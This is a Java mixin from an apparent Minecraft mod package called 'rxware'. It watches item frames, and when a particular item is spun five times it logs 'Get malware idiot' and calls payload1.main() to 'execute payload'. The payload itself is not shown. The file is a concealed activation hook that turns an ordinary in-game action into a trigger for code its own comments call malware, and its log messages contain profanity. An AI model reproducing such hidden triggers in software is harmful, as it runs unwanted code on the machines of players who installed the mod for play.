package rxware.mixin;

import net.minecraft.entity.decoration.ItemFrameEntity;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.world.*;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.registry.Registry;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import rxware.RXWare;
import rxware.payload1;

import java.io.IOException;


@Mixin(ItemFrameEntity.class)
public class ItemFrameInteractMixin {
    Item potentialDorito;
    int spinAmount;
    @Inject(method = "setHeldItemStack(Lnet/minecraft/item/ItemStack;Z)V", at = @At("TAIL"))
    private void onSetHeldItem(ItemStack value, boolean update, CallbackInfo ci) {
        if (!Registry.ITEM.getId(RXWare.rotor).equals(Registry.ITEM.getId(value.getItem()))) {
            return;
        }
        RXWare.LOGGER.info("Added '" + value.getItem().getName() + "' entity to item frame.");
        potentialDorito = value.getItem();
    }
    @Inject(method = "setRotation(IZ)V", at = @At("TAIL"))
    private void setRotation(int value, boolean bl, CallbackInfo cl) throws IOException {
        if (!Registry.ITEM.getId(RXWare.rotor).equals(Registry.ITEM.getId(potentialDorito))) {
            //If item being spun is not a dorito...
            return; //do nothing
        }

        RXWare.LOGGER.info("ITS FUCKING SPINNING!");
        // Increments int variable each time item frame dorito is rotated
        spinAmount++;
        // Resets spinAmount and tickTimer when a chosen amount of ticks has happened
        if (RXWare.tickTimer >= RXWare.TICK_LIMIT) {
            RXWare.tickTimer = 0;
            spinAmount = 0;
        }
        // This will be the part that makes the malware window
        if (spinAmount >= 5) {
            RXWare.LOGGER.info("Get malware idiot");
            System.out.println("Boundry test");

            payload1.main(); //Execute payload
        }
    }
}
